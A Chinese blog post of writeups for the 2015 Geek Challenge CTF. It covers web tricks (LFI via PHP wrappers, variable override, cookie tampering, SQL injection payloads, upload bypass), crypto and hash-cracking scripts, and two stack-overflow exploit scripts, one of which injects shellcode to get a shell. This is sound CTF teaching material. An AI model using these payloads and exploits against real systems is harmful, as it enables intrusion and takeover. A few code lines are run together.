---
title: 第六季极客大挑战一些writeup
categories: technology
date: 2015-10-31 16:09:39
tags: [极客大挑战,writeup]
---

###  Vous ferez Fran?ais

提示说需要会法语，http头中的Accept-Language就是表示语言，法语是fr-FR，修改这个提交就能拿到flag

![d121e2db0075ed4067a6b1211e7d4d99.png](/images/d121e2db0075ed4067a6b1211e7d4d99.png)

###  小明

打开后发现url后面是file=xxx.php，感觉这就是LFI没跑了，然后在http头中发现一句话

`Tips:try to read README`

访问发现让读这个网页的源码，使用php伪协议读取，解base64发现flag

![a49e2eb9001c04a026583cb2350f8d97.png](/images/a49e2eb9001c04a026583cb2350f8d97.png)

###  http_

![d87bd8d43366220612649a24191f481c.png](/images/d87bd8d43366220612649a24191f481c.png)

###  小明2

看到上面的提示是，机器人为网站工作，想到robots.txt,访问之后发现index.php.bak

源码中可以发现这么一段代码

```php
$whattodo = "nothing";
    @extract($_REQUEST);
    if($whattodo == "save the world!"){
        echo $flag;
    }
```

是一个变量覆盖漏洞，post或者get提交whattodo=save the world!即可拿到flag

![78b70f208f783a317745b2f49a0821ec.png](/images/78b70f208f783a317745b2f49a0821ec.png)

###  asp你会吗

看到asp文件里面是VBscript加密，解密之后看文件内容，这种在webshell里找flag的一般都是后门密码。 搜索一发pass，很快就找到flag了。

![ac9bbf6efa88fb289fae3653e6ea8ca3.png](/images/ac9bbf6efa88fb289fae3653e6ea8ca3.png)

###  签到题

去微博和官微私信就能拿到flag了

![23e20e241c31bf7a1e2e11d9047d0670.png](/images/23e20e241c31bf7a1e2e11d9047d0670.png)

###  小彩蛋

![c9f7ee7d76798a794199de05c2bcf1d2.png](/images/c9f7ee7d76798a794199de05c2bcf1d2.png)

###  神秘代码并不神秘

可以看到这是一段shellcode，在网上抄了一段执行的c代码，编译运行之后发现提示段错误，然后沐师傅说，编译也要带姿势的，然后去网上找了一个编译的姿势，编译之后直接运行就打印出flag了( 必须要在32bit下才行，64bit会一直段错误的。。 )

![fda8d2c22488aba76f473d9fa413f0a6.png](/images/fda8d2c22488aba76f473d9fa413f0a6.png)

###  口号更新

在zone的注释中可以看到一段提示

`<!--do you kown how to update slogan?  /slogan -->`

然后直接访问/slogan是不行的，上burp测试之后发现，是要post提交slogan这个参数，值为flag_flag_flag的时候，就可以看到打印出了flag

![92ebc2d372b7ccbf857c3f9e310e3660.png](/images/92ebc2d372b7ccbf857c3f9e310e3660.png)

###  饼干饼干饼干

访问之后发现提示需要从谷歌过来，那么上burp将referer改成google之后，又发现提示不是管理员，这时在cookie中发现is_admin的键值，将值改为1，再提交，得到flag

###  Transposition cipher

把加密后的文档保存在1.txt中

```python
divide = lambda t,l:[t[i:i+l] for i in xrange(0,len(t),l)]
with open('1.txt', 'r') as f:
  text = f.read()
text = divide(text, len(text)/7)
for i in xrange(len(text[0])):
  print text[6][i:i+1]+text[5][i:i+1]+text[4][i:i+1]+text[1][i:i+1]+text[0][i:i+1]+text[2][i:i+1]+text[3][i:i+1], #密钥是7, 6, 5, 2, 1, 3, 4
```

跑一下就能在里面找到flag

![b6d3d21f03dd79da1a08733fd3b3ae2e.png](/images/b6d3d21f03dd79da1a08733fd3b3ae2e.png)

###  土豪的密码

按密码学的看法来说。。。这个算法不会出两个一样的值，而且没有OTP，所以直接通过明文ascii(32, 127) 推出来每个字母加密后的密文， 通过密文的数字来倒着找明文也行

```python
import string
dic={}
plain = ''for i in xrange(32, 127):
  cipher = (7*(i-32)+25)%96 +32
  dic[cipher]=chr(i)
divide = lambda t,l:[t[i:i+l] for i in xrange(0,len(t),l)]
cipher = '2a50492e5e6f61725b4a51203e25494974227b3c72487250'
cipher = divide(cipher, 2)
for i in xrange(len(cipher)):
  cipher[i] = string.atoi(cipher[i], 16)
  plain += dic[cipher[i]]
print plain
```

###  消失的flag

根据题目提示，分析pcap包
`http and http contains "png"`
得到五个图片
图片的内容为5个文件的各种计算之后的值

毕竟Jzhou师傅有计算平台，于是….就决定了爆破sha1，其实cmd5后面四个图的密码，一条一毛而已，第一个用膝盖想想也是SYC{了

```python
import hashlib
count =0
dic=["31D413CCABE56E4949384FBEF60424795A565558", "138561FB21CDE19596A9CD0EE487458C6716F59A", "73E490E57BBEAA21C92175048151C15C18CF6E6F", "EB74E94271A227B241C4D631C2E98367281A4058", "978C3EEC59BEA942ED8B619C33544A8E5759DB27"]
for i in xrange(32,127):
    for j in xrange(32,127):
        for k in xrange(32,127):
            for l in xrange(32,127):
                data = chr(i)+chr(j)+chr(k)+chr(l)
                a = hashlib.sha1(data).hexdigest().upper()
                if a in dic:
                    print data +" "+ a
                    count+=1
                    if count==5:
                        exit(0)
```

###  AAencode

颜文字。解密后发现是console.log("xxx")，那么复制这一段直接放console中运行，就可以得到一串base32编码，解开就是flag

![3eb9262ffc039d49b9712164b164ab60.png](/images/3eb9262ffc039d49b9712164b164ab60.png)

###  大鲨鱼

用Wireshark打开之后直接File->Export->Objects->http，可以看到flag.jpeg.保存出来打开就能看到flag

###  会不会写代码？

下载下来发现.git文件夹，然后git log查看一下，发现最新的commit对flag做了手脚

版本回退后不知道为什么没找到 Orz

![60681bf8a4212085585b8c13a0037ff5.png](/images/60681bf8a4212085585b8c13a0037ff5.png)

###  遗失的密码

根据题意，管理员密码为'joker'+YYYYMMDD格式的字符串，这里可以用如下代码生成字典并保存在1.txt中

```python
import datetimewith open('1.txt','r+') as f:
  for i in xrange(1970,2015):
    for j in xrange(1,13):
      for k in xrange(1,32):
        try:
          f.write('joker'+datetime.date(i,j,k).strftime('%Y%m%d')+'\n')
        except ValueError:
          continue
```

在制作完字典之后，我们需要把给出的那个密码串保存在pass.txt中

最后使用john跑一下30s左右即可得到密码

###  sqli1

加单引号之后报错了，很简单的一个sqli，直接union就好了

###  sqli2

宽字节注入

###  sqli3

一开始打开，发现没有了前面2个题的提示，不知道注入点在哪儿，只看到一张图片，
360那个比赛上出现过，web题的入口点全都是隐写在图片里面的，所以这次下载下来，打开发现图片最后加了提示

![4a3f4ae48d25147ba7ef4c21898ea29f.png](/images/4a3f4ae48d25147ba7ef4c21898ea29f.png)

可以知道注入点是lalala，但是加了之后并没有什么卵用，fuzz知道他过滤了空格，而且类似%0a，换行都不起作用，感觉有毒一样，猜想是不是注入点的位置有点奇葩，柠檬牛给了个hint说这有白盒，然后在根目录下找到www.zip 解压得到一个php文件

```php
function filtrate($str)
{
    /**
    *   此处省略
    */
}
$link = mysql_connect('localhost','xxx','xxx');
if(!$link){
    die('error'.mysql_error());
}
mysql_select_db('sql3',$link) or die ('cannot use database'.mysql_error());
if(isset($_GET['uid'])){
    $uid = filtrate($_GET['uid']);
    $sql = "select content from content where id=1 order by id limit 0,$uid";
}
else{
    echo "Nothing!";
    exit();
}
$result = @mysql_query($sql);
echo mysql_error();
while ($row = @mysql_fetch_row($result)) {
    echo $row[0];
}
@mysql_free_result($result);
@mysql_close($link);
```

把过滤的地方给省略掉了。。 但是知道这是Limit后面的注入，于是我们可以构造出一条payload:

```
http://sql.sycsec.com/d07127c7c9267637d554c3f79e1ee203/?lalala=1/*a*/PROCEDURE/*a*/ANALYSE(extractvalue(1,concat(0x7e,version())),1)
```

表名里面含有#，而且还过滤了空格，但是查询语句是可以这么写的 select(columns)from(table)，这么一来就bypass了空格过滤，mysql里面可以用“反引号来区别，所以构造最终爆flag的payload是(记得#要urlencode)

###  SYC美男子

拉进IDA之后，可以很快找到这一个关键的函数

![b0b89a957cefba05bea96cef9fc8f5ea.png](/images/b0b89a957cefba05bea96cef9fc8f5ea.png)

在函数开头的位置，sub esp,88h 知道这个函数开了88h字节的空间，在函数开头的位置，定义了一个变量，这个变量所处位置就在栈顶，毫无检查就直接scanf，造成了栈上的一个溢出，找到getflag函数的地址08048B06，因为变量在栈顶0h处，使用88h字节的junk来填充，写一个exp(小端)

```python
#!/usr/bin/env python
#encoding=utf-8
from zio import *
target = ("./pwnme") #本地测试
if __name__ == "__main__":
    io = zio(target,print_read=False, print_write=False, timeout=100000)
    ebp = '\x00\x00\x00\x00'   
    ret = l32(0x08048B06)
    payload = 'A'*0x88+ebp+ret
    io.read_until(">> 6. Exit")
    io.writeline('5')
    io.read_until("Input his name :")
    io.writeline(payload)
    io.interact()
```

###  SYC美男子二

让拿shell，然而一开始入坑了，scanf是不能接收0a 0b 0c 00这些字符的，所以用msf生成一段规避这些字符的shellcode，然后再junk+jmp esp+shellcode就可以拿到shell了

```python
#!/usr/bin/env python
#encoding=utf-8
from zio import *
target = ("./pwnme")
if __name__ == "__main__":
    io = zio(target,print_read=False, print_write=False, timeout=100000)
    ret = l32(0x0805888d)
    shellcode=""
    shellcode+="\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
    shellcode+="\xdb\xd9\xe0\x04\x83\xee\xfc\xe2\xf4\xb1\xd2\xb8\x9d\x89\xbf"
    shellcode+="\x88\x29\xb8\x50\x07\x6c\xf4\xaa\x88\x04\xb3\xf6\x82\x6d\xb5"
    shellcode+="\x50\x03\x56\x33\xd1\xe0\x04\xdb\xf6\x82\x6d\xb5\xf6\x93\x6c"
    shellcode+="\xdb\x8e\xb3\x8d\x3a\x14\x60\x04"
    payload = 'A'*(0x88+0x4)+ret+shellcode
    io.read_until(">> 6. Exit")
    io.writeline('5')
    io.read_until("Input his name :")
    io.writeline(payload)
    io.interact()
```

###  bypass it

一道bypass上传的题，番茄师傅刚发出来就有人截图说秒了 ，一下子就慌了，一开始想复杂了，随便传了一个文件之后发现给出了路径，但是这没什么卵用，正常传了一个php文件发现提示是。
```
php is the best programing language
```

于是改后缀为php3,4,5成功


### 三叶草留言板

string.fromCharCode 可以过

### Dede

根目录下有web.zip， 发现主页存在一个后门，ph老师博客有讲到
